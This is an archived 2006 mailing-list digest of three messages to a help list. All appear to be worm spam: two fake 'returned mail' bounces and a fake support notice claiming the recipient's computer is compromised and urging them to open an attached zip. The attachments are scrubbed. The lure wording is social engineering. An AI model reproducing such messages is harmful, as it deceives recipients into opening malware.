@@ -1,0 +1,74 @@
+From donart at atg1.com  Tue Jun 13 06:10:50 2006
+From: donart at atg1.com (donart at atg1.com)
+Date: Mon, 12 Jun 2006 23:10:50 -0500
+Subject: [Pplt-help] Returned mail: see transcript for details
+Message-ID: <200606130411.k5D4Bhb16977@bat.berlios.de>
+
+
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: fspodxl.zip
+Type: application/octet-stream
+Size: 28952 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/pplt-help/attachments/20060612/e64fc50a/attachment.obj>
+
+From noreply at berlios.de  Wed Jun 28 16:54:16 2006
+From: noreply at berlios.de (Mail Delivery Subsystem)
+Date: Wed, 28 Jun 2006 09:54:16 -0500
+Subject: [Pplt-help] Pplt-help@lists.berlios.de
+Message-ID: <200606281456.k5SEuDb01102@bat.berlios.de>
+
+This message was not delivered due to the following reason:
+
+Your message was not delivered because the destination server was
+not reachable within the allowed queue period. The amount of time
+a message is queued before it is returned depends on local configura-
+tion parameters.
+
+Most likely there is a network problem that prevented delivery, but
+it is also possible that the computer is turned off, or does not
+have a mail system running right now.
+
+Your message could not be delivered within 5 days:
+Server 163.85.24.21 is not responding.
+
+The following recipients could not receive this message:
+<pplt-help at lists.berlios.de>
+
+Please reply to postmaster at lists.berlios.de
+if you feel this message to be in error.
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: letter.zip
+Type: application/octet-stream
+Size: 28950 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/pplt-help/attachments/20060628/63b7c4cd/attachment.obj>
+
+From ietfmibs at ops.ietf.org  Thu Jun 29 21:40:49 2006
+From: ietfmibs at ops.ietf.org (ietfmibs at ops.ietf.org)
+Date: Thu, 29 Jun 2006 20:40:49 +0100
+Subject: [Pplt-help] Message could not be delivered
+Message-ID: <200606291945.k5TJjuK01196@bat.berlios.de>
+
+Dear user pplt-help at lists.berlios.de,
+
+Your account has been used to send a huge amount of unsolicited commercial e-mail messages during this week.
+We suspect that your computer had been compromised and now runs a hidden proxy server.
+
+We recommend that you follow our instruction in the attachment in order to keep your computer safe.
+
+Virtually yours,
+lists.berlios.de user support team.
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: readme.zip
+Type: application/octet-stream
+Size: 29100 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/pplt-help/attachments/20060629/e3776608/attachment.obj>
+
